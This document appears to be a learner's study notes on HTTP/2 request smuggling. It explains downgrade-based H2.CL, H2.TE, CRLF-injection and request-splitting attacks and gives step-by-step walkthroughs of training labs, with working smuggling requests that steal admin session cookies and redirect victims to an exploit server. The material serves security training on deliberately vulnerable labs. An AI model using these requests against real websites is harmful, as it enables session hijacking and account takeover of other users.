### HTTP/2 downgrading
HTTP/2 downgrading is the process of rewriting HTTP/2 requests using HTTP/1 syntax to generate an equivalent HTTP/1 request. Web servers and reverse proxies often do this in order to offer HTTP/2 support to clients while communicating with back-end servers that only speak HTTP/1

This works because each version of the protocol is fundamentally just a different way of representing the same information. Each item in an HTTP/1 message has an approximate equivalent in HTTP/2. 

HTTP/2 downgrading is extremely widespread and is even the default behavior for a number of popular reverse proxy services. In some cases, there isn't even an option to disable it. 

HTTP/2's built-in length mechanism means that, when HTTP downgrading is used, there are potentially three different ways to specify the length of the same request, which is the basis of all request smuggling attacks. 

### H2.CL vulnerabilities
HTTP/2 requests don't have to specify their length explicitly in a header. During downgrading, this means front-end servers often add an HTTP/1 Content-Length header, deriving its value using HTTP/2's built-in length mechanism. Interestingly, HTTP/2 requests can also include their own content-length header. In this case, some front-end servers will simply reuse this value in the resulting HTTP/1 request. 

The spec dictates that any content-length header in an HTTP/2 request must match the length calculated using the built-in mechanism, but this isn't always validated properly before downgrading. As a result, it may be possible to smuggle requests by injecting a misleading content-length header. Although the front-end will use the implicit HTTP/2 length to determine where the request ends, the HTTP/1 back-end has to refer to the Content-Length header derived from your injected one, resulting in a desync

Front-end (HTTP/2):
```bash
:method 	POST
:path 	/example
:authority 	vulnerable-website.com
content-type 	application/x-www-form-urlencoded
content-length 	0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Content-Length: 10

x=1
```

Back-end (HTTP/1):
```bash
POST /example HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Content-Length: 10

x=1GET / H
```

> Tip:
>
> When performing some request smuggling attacks, you will want headers from the victim's request to be appended to your smuggled prefix. However, these can interfere with your attack in some cases, resulting in duplicate header errors and suchlike. In the example above, we've mitigated this by including a trailing parameter and a Content-Length header in the smuggled prefix. By using a Content-Length header that is slightly longer than the body, the victim's request will still be appended to your smuggled prefix but will be truncated before the headers. 

### PRACTITIONER Lab: H2.CL request smuggling
Lab's description:
This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests even if they have an ambiguous length.

To solve the lab, perform a request smuggling attack that causes the victim's browser to load and execute a malicious JavaScript file from the exploit server, calling alert(document.cookie). The victim user accesses the home page every 10 seconds. 

Solution:
First we've got to confirm H2.CL:

Let's craft an attack req and send it:
```bash
POST / HTTP/2
Host: 0ae700f603b9e4588078eee200b400a6.web-security-academy.net
Cookie: session=yh8gFnvlEdf8TxU3ONh5TghQWFzToAFR
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1
GET /doesnotexist HTTP/1.1
X-Ignore: x
```

And after it we send normal req:
```bash
GET /?search=hi HTTP/2
Host: 0ae700f603b9e4588078eee200b400a6.web-security-academy.net
Cookie: session=yh8gFnvlEdf8TxU3ONh5TghQWFzToAFR
```

In the response to the normal req we get:
```bash
HTTP/2 404 Not Found
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 11

"Not Found"
```

We get this response because attack req poisoned the backend server. It worked because the frontend server ignored the `Content-length` header. http 2 has its own mechanism for determining the length. 
RFC states that `Content-length` is allowed in http 2 however it must match the length that is calculated by the http 2 mechanism. But in this lab the front end server simply ignores the `Content-length` header when we send an http 2 req.

It's also interesting, that there's a req:
```bash
GET /resources/js/analytics.js HTTP/2
```
Which returns a js file in the response. If we change the req url to the following:
```bash
GET /resources/js HTTP/2
```
Then in response we'll get a redirect:
```bash
HTTP/2 302 Found
Location: https://0ae700f603b9e4588078eee200b400a6.web-security-academy.net/resources/js/
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

This redirect is a really dangerous thing in combination with req smuggling
To understand the following please read `Using HTTP request smuggling to turn an on-site redirect into an open redirect` but in a nutshell, the backend uses the value of the Host header to know where to redirect clients

So to redirect victim to the exploit server we create and send the attack req:
```bash
POST / HTTP/2
Host: 0a6b0063047a3c45802967ed00e500f8.web-security-academy.net
Cookie: session=PlXHVNlsp0VqG0M8gscMaceD1kPhAThG
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1
GET /resources/js HTTP/1.1
Host: exploit-0ac200b604ea3cfc8034665d01ef00b9.exploit-server.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 3

x=
```

### H2.TE vulnerabilities
Chunked transfer encoding is incompatible with HTTP/2 and the spec recommends that any transfer-encoding: chunked header you try to inject should be stripped or the request blocked entirely. If the front-end server fails to do this, and subsequently downgrades the request for an HTTP/1 back-end that does support chunked encoding, this can also enable request smuggling attacks.

Front-end (HTTP/2)
```bash
:method 	POST
:path 	/example
:authority 	vulnerable-website.com
content-type 	application/x-www-form-urlencoded
transfer-encoding 	chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: bar
```

Back-end (HTTP/1)
```bash
POST /example HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: bar
```

If a website is vulnerable to either H2.CL or H2.TE request smuggling, you can potentially leverage this behavior to perform the same attacks that we covered in http 1 request smuggling attacks

### Hidden HTTP/2 support
Browsers and other clients, including Burp, typically only use HTTP/2 to communicate with servers that explicitly advertise support for it via ALPN as part of the TLS handshake.

Some servers support HTTP/2 but fail to declare this properly due to misconfiguration. In such cases, it can appear as though the server only supports HTTP/1.1 because clients default to this as a fallback option. As a result, testers may overlook viable HTTP/2 attack surface and miss protocol-level issues, such as the examples of HTTP/2 downgrade-based request smuggling that we covered above.

To force Burp Repeater to use HTTP/2 so that you can test for this misconfiguration manually:
- From the Settings dialog, go to Tools > Repeater.
- Under Connections, enable the Allow HTTP/2 ALPN override option.
- In Repeater, go to the Inspector panel and expand the Request attributes section.
- Use the switch to set the Protocol to HTTP/2. Burp will now send all requests on this tab using HTTP/2, regardless of whether the server advertises support for this.

> Note:
>
> If you're using Burp Suite Professional, Burp Scanner automatically detects instances of hidden HTTP/2 support

### Response queue poisoning
Response queue poisoning is a powerful form of request smuggling attack that causes a front-end server to start mapping responses from the back-end to the wrong requests. In practice, this means that all users of the same front-end/back-end connection are persistently served responses that were intended for someone else.

This is achieved by smuggling a complete request, thereby eliciting two responses from the back-end when the front-end server is only expecting one. 

### How to construct a response queue poisoning attack
For a successful response queue poisoning attack, the following criteria must be met:
- The TCP connection between the front-end server and back-end server is reused for multiple request/response cycles.
- The attacker is able to successfully smuggle a complete, standalone request that receives its own distinct response from the back-end server.
- The attack does not result in either server closing the TCP connection. Servers generally close incoming connections when they receive an invalid request because they can't determine where the request is supposed to end.

### Understanding the aftermath of request smuggling
Request smuggling attacks usually involve smuggling a partial request, which the server adds as a prefix to the start of the next request on the connection. It's important to note that the content of the smuggled request influences what happens to the connection following the initial attack.

If you just smuggle a request line with some headers, assuming that another request is sent on the connection shortly afterwards, the back-end ultimately still sees two complete requests. 

If you instead smuggle a request that also contains a body, the next request on the connection will be appended to the body of the smuggled request. This often has the side-effect of truncating the final request based on the apparent Content-Length. As a result, the back-end effectively sees three requests, where the third "request" is just a series of leftover bytes: 

Front-end (CL)
```bash
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Type: x-www-form-urlencoded
Content-Length: 120
Transfer-Encoding: chunked

0

POST /example HTTP/1.1
Host: vulnerable-website.com
Content-Type: x-www-form-urlencoded
Content-Length: 25

x=GET / HTTP/1.1
Host: vulnerable-website.com
```

Back-end (TE)
```bash
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Type: x-www-form-urlencoded
Content-Length: 120
Transfer-Encoding: chunked

0

POST /example HTTP/1.1
Host: vulnerable-website.com
Content-Type: x-www-form-urlencoded
Content-Length: 25

x=GET / HTTP/1.1
Host: vulnerable-website.com
```

As these leftover bytes don't form a valid request, this typically results in an error, causing the server to close the connection

### Smuggling a complete request
With a bit of care, you can smuggle a complete request instead of just a prefix. As long as you send exactly two requests in one, any subsequent requests on the connection will remain unchanged:

Front-end (CL):
```bash
POST / HTTP/1.1\r\n
Host: vulnerable-website.com\r\n
Content-Type: x-www-form-urlencoded\r\n
Content-Length: 61\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n
GET /anything HTTP/1.1\r\n
Host: vulnerable-website.com\r\n
\r\n # 61 content length includes this line as well
GET / HTTP/1.1\r\n
Host: vulnerable-website.com\r\n
\r\n
```

Back-end (TE)
```bash
POST / HTTP/1.1\r\n
Host: vulnerable-website.com\r\n
Content-Type: x-www-form-urlencoded\r\n
Content-Length: 61\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n
GET /anything HTTP/1.1\r\n
Host: vulnerable-website.com\r\n
\r\n
GET / HTTP/1.1\r\n
Host: vulnerable-website.com\r\n
\r\n
```

Notice that no invalid requests are hitting the back-end, so the connection should remain open following the attack

### Desynchronizing the response queue
When you smuggle a complete request, the front-end server still thinks it only forwarded a single request. On the other hand, the back-end sees two distinct requests, and will send two responses accordingly: 

The front-end correctly maps the first response to the initial "wrapper" request and forwards this on to the client. As there are no further requests awaiting a response, the unexpected second response is held in a queue on the connection between the front-end and back-end.

When the front-end receives another request, it forwards this to the back-end as normal. However, when issuing the response, it will send the first one in the queue, that is, the leftover response to the smuggled request.

The correct response from the back-end is then left without a matching request. This cycle is repeated every time a new request is forwarded down the same connection to the back-end. 

### Stealing other users' responses
Once the response queue is poisoned, the attacker can just send an arbitrary request to capture another user's response

They have no control over which responses they receive as they will always be sent the next response in the queue i.e. the response to the previous user's request. In some cases, this will be of limited interest. However, using tools like Burp Intruder, an attacker can easily automate the process of reissuing the request. By doing so, they can quickly grab an assortment of responses intended for different users, at least some of which are likely to contain useful data.

An attacker can continue to steal responses like this for as long as the front-end/back-end connection remains open. Exactly when a connection is closed differs from server to server, but a common default is to terminate a connection after it has handled 100 requests. It's also trivial to repoison a new connection once the current one is closed.

> Tip
>
> To make it easier to differentiate stolen responses from responses to your own requests, try using a non-existent path in both of the requests that you send. That way, your own requests should consistently receive a 404 response, for example

> Note:
>
> This attack is possible both via classic HTTP/1 request smuggling and by exploiting HTTP/2 downgrading.

### PRACTITIONER Lab: Response queue poisoning via H2.TE request smuggling
Lab's description:
This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests even if they have an ambiguous length.

To solve the lab, delete the user carlos by using response queue poisoning to break into the admin panel at /admin. An admin user will log in approximately every 15 seconds.

The connection to the back-end is reset every 10 requests, so don't worry if you get it into a bad state - just send a few normal requests to get a fresh connection. 

Solution:
FIrst we need to confirm H2.TE, so we send the attack req:
```bash
POST / HTTP/2
Host: 0ae000d703ab28f1810953e500ce003d.web-security-academy.net
Cookie: session=lF2n6WnawFtqt7IrLoDsdCXBoBZh4ojp
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /doesnotexist HTTP/1.1
X-Ignore: x
```

And we send normal req after it:
```bash
GET /post?postId=1 HTTP/2
Host: 0ae000d703ab28f1810953e500ce003d.web-security-academy.net
Cookie: session=lF2n6WnawFtqt7IrLoDsdCXBoBZh4ojp
```
and in the response to the normal req we get:
```bash
HTTP/2 404 Not Found
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 11

"Not Found"
```
So H2.TE is confirmed

Now we need to poison the response queue. So we modify our attack req and send it:
```bash
POST / HTTP/2
Host: 0ae000d703ab28f1810953e500ce003d.web-security-academy.net
Cookie: session=lF2n6WnawFtqt7IrLoDsdCXBoBZh4ojp
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /doesnotexist HTTP/1.1
Host: 0a1d00bb04f63c39803fa355003e003d.web-security-academy.net\r\n
\r\n
```

And norm req stays the same and after we send our norm req in the response we get 404 Not found, which confirms that the response queue was poisoned

So we now need to keep sending normal requests until in the reponse we see the response to login endpoint which is going to contain admin's session cookie.

Finally we get the response to the admin's req:
```bash
HTTP/2 302 Found
Location: /my-account?id=administrator
Set-Cookie: session=SS6L7uVvYDXUBbPud7L1nMY4sZDzP17y; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```
So we copy their cookie and the lab is solved

### Request smuggling via CRLF injection
Even if websites take steps to prevent basic H2.CL or H2.TE attacks, such as validating the content-length or stripping any transfer-encoding headers, HTTP/2's binary format enables some novel ways to bypass these kinds of front-end measures.

In HTTP/1, you can sometimes exploit discrepancies between how servers handle standalone newline (\n) characters to smuggle prohibited headers. If the back-end treats this as a delimiter, but the front-end server does not, some front-end servers will fail to detect the second header at all.
```bash
Foo: bar\nTransfer-Encoding: chunked
```

This discrepancy doesn't exist with the handling of a full CRLF (\r\n) sequence because all HTTP/1 servers agree that this terminates the header.

On the other hand, as HTTP/2 messages are binary rather than text-based, the boundaries of each header are based on explicit, predetermined offsets rather than delimiter characters. This means that \r\n no longer has any special significance within a header value and, therefore, can be included inside the value itself without causing the header to be split:
```bash
foo bar\r\nTransfer-Encoding: chunked
```

This may seem relatively harmless on its own, but when this is rewritten as an HTTP/1 request, the \r\n will once again be interpreted as a header delimiter. As a result, an HTTP/1 back-end server would see two distinct headers:
```bash
Foo: bar
Transfer-Encoding: chunked
```

### PRACTITIONER Lab: HTTP/2 request smuggling via CRLF injection
Lab's description:
This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests and fails to adequately sanitize incoming headers.

To solve the lab, use an HTTP/2-exclusive request smuggling vector to gain access to another user's account. The victim accesses the home page every 15 seconds.

If you're not familiar with Burp's exclusive features for HTTP/2 testing, please refer to the [documentation](https://portswigger.net/burp/documentation/desktop/http2) for details on how to use them. 

> Hint:
>
> To inject newlines into HTTP/2 headers, use the Inspector to drill down into the header, then press the Shift + Return keys. Note that this feature is not available when you double-click on the header. 

Solution:
In this lab the front-end server is stripping away the `Transfer-encoding` header during rewrite to http 1.1
But the frontend does not strip away CRLF during rewrite

So we first need to confirm the H2.TE vulnerability
Our attack req:
```bash
POST / HTTP/2
Host: 0ae000d703ab28f1810953e500ce003d.web-security-academy.net
Cookie: session=lF2n6WnawFtqt7IrLoDsdCXBoBZh4ojp
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /doesnotexist HTTP/1.1
X-Ignore: x
```
And we send our norm req (which is another random GET req) afterwards and we see that request smuggling doesn't work
This is likely due to the fact that the frontend server stripps away `Transfer-Encoding` header

So we try to hide `Transfer-Encoding` header behind CRLF via Inspector > headers > add new header e.g. Foo: Bar and press `Shift + Return` (Note that this feature is not available when you double-click on the header) and add `Transfer-Encoding: chunked`
The req is now kettled

Now let's try to steal admin's request
There's a post new comment endpoint, and we want to use it, to post the admin's req as a body of a new comment. So the attack req becomes:
```bash
POST / HTTP/2
Host: 0ad700e5047a6d618036e4ef00c60065.web-security-academy.net
Foo: Bar\r\nTransfer-Encoding: chunked # this is done via inspector > headers

0

POST /post/comment HTTP/1.1
Host: 0ad700e5047a6d618036e4ef00c60065.web-security-academy.net
Cookie: session=stZZQj4oriCtBaszMVTWJmWKBlquimfI
Content-Length: 950

csrf=I0fOZPzC1aRidkGCozA9mdGgI3QKS0hi&postId=5&name=ff&email=ff%40ff.com&website=http%3A%2F%2Fff.com&comment=
```

Wait 15 seconds and admin posts a comment with their cookie

### HTTP/2-exclusive vectors
Due to the fact that HTTP/2 is a binary protocol rather than text-based, there are a number of potential vectors that are impossible to construct in HTTP/1 due to the limitations of its syntax.

We've already seen how you can inject CRLF sequences into a header value. In this section, we'll give you an idea of some of the other HTTP/2-exclusive vectors you can use to inject payloads. Although these kinds of requests are officially prohibited by the HTTP/2 specification, some servers fail to validate and block them effectively. 

> Note:
>
> It's only possible to perform these attacks using the [specialized HTTP/2 features](https://portswigger.net/burp/documentation/desktop/http2/performing-http2-exclusive-attacks) in Burp's Inspector panel. 

### Injecting via header names
In HTTP/1, it's not possible for a header name to contain a colon because this character is used to indicate the end of the name to parsers. This is not the case in HTTP/2.

By combining colons with \r\n characters, you may be able to use an HTTP/2 header's name field to sneak other headers past front-end filters. These will then be interpreted as separate headers on the back-end once the request is rewritten using HTTP/1 syntax:

Front-end (HTTP/2)
```bash
foo: bar\r\nTransfer-Encoding: chunked\r\nX: 	ignore
```

Back-end (HTTP/1) 
```bash
Foo: bar\r\n
Transfer-Encoding: chunked\r\n
X: ignore\r\n
```

Other methods are described [here](https://portswigger.net/web-security/request-smuggling/advanced/http2-exclusive-vectors)

### HTTP/2 request splitting
When we looked at response queue poisoning, you learned how to split a single HTTP request into exactly two complete requests on the back-end. In the example we looked at, the split occurred inside the message body, but when HTTP/2 downgrading is in play, you can also cause this split to occur in the headers instead.

This approach is more versatile because you aren't dependent on using request methods that are allowed to contain a body. For example, you can even use a GET request: 
```bash
:method 	GET
:path 	/
:authority 	vulnerable-website.com
foo 	

bar\r\n
\r\n
GET /admin HTTP/1.1\r\n
Host: vulnerable-website.com
```
This is also useful in cases where the content-length is validated and the back-end doesn't support chunked encoding. 

### Accounting for front-end rewriting
To split a request in the headers, you need to understand how the request is rewritten by the front-end server and account for this when adding any HTTP/1 headers manually. Otherwise, one of the requests may be missing mandatory headers.

For example, you need to ensure that both requests received by the back-end contain a Host header. Front-end servers typically strip the :authority pseudo-header and replace it with a new HTTP/1 Host header during downgrading. There are different approaches for doing this, which can influence where you need to position the Host header that you're injecting.

Consider the following request: 
```bash
:method 	GET
:path 	/
:authority 	vulnerable-website.com
foo 	

bar\r\n
\r\n
GET /admin HTTP/1.1\r\n
Host: vulnerable-website.com
```
During rewriting, some front-end servers append the new Host header to the end of the current list of headers. As far as an HTTP/2 front-end is concerned, this after the foo header. Note that this is also after the point at which the request will be split on the back-end. This means that the first request would have no Host header at all, while the smuggled request would have two. In this case, you need to position your injected Host header so that it ends up in the first request once the split occurs: 
```bash
:method 	GET
:path 	/
:authority 	vulnerable-website.com
foo 	

bar\r\n
Host: vulnerable-website.com\r\n
\r\n
GET /admin HTTP/1.1
```
You will also need to adjust the positioning of any internal headers that you want to inject in a similar manner

### PRACTITIONER Lab: HTTP/2 request splitting via CRLF injection
Lab's description:  
This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests and fails to adequately sanitize incoming headers.

To solve the lab, delete the user carlos by using response queue poisoning to break into the admin panel at /admin. An admin user will log in approximately every 10 seconds.

The connection to the back-end is reset every 10 requests, so don't worry if you get it into a bad state - just send a few normal requests to get a fresh connection. 

Solution:
First we try to craete our attack req:
```bash
GET / HTTP/2
Host: 0a3e007e034384fb84791b6700af0014.web-security-academy.net
Cookie: session=VIjSEwy2B5TpJ4fbQhTbRpBphycUL0ST
Foo: Bar\r\n\r\nGET /doesnotexist HTTP/1.1\r\nHost: 0a3e007e034384fb84791b6700af0014.web-security-academy.net # this is done via inspector > headers
```

Please note in the inspector > headres we may also need to add \r\n\r\n so that the header becomes:
```bash
Foo: Bar\r\n\r\nGET /doesnotexist HTTP/1.1\r\nHost: 0a3e007e034384fb84791b6700af0014.web-security-academy.net\r\n\r\n # this is done via inspector > headers
```
Whether we need to add \r\n\r\n or not depends if the front end server adds them during the downgrade to HTTP 1.1

And later when we send any other normal req we get:
```bash
HTTP/2 404 Not Found
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 11

"Not Found"
```

So now we wanna get the victim's response so we modify the first line of our attack req to `/doesnotexist` because we want to get 404 for all our requests and when we get something other than 404 we know it's coming from the victim's user:
```bash
GET /doesnotexist HTTP/2
Host: 0a3e007e034384fb84791b6700af0014.web-security-academy.net
Cookie: session=VIjSEwy2B5TpJ4fbQhTbRpBphycUL0ST
Foo: Bar\r\n\r\nGET /doesnotexist HTTP/1.1\r\nHost: 0a3e007e034384fb84791b6700af0014.web-security-academy.net # this is done via inspector > headers
```

And finally in one of the responses we got:
```bash
HTTP/2 302 Found
Location: /my-account?id=administrator
Set-Cookie: session=KyJaZcG8pwQxlsW9XdqncjIl9PhIlwoX; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

So we copy the cookie, become admin and delete carlos

> Tip:
>
> In the example above, we've split the request in a way that triggers response queue poisoning, but you can also smuggle prefixes for classic request smuggling attacks in this way. In this case, your injected headers may clash with the headers in the request that is appended to your prefix on the back-end, resulting in duplicate header errors or causing the request to be terminated in the wrong place. To mitigate this, you can include a trailing body parameter in the smuggled prefix along with a Content-Length header that is slightly longer than the body. The victim's request will still be appended to your smuggled prefix but will be truncated before the headers. 

### HTTP request tunnelling

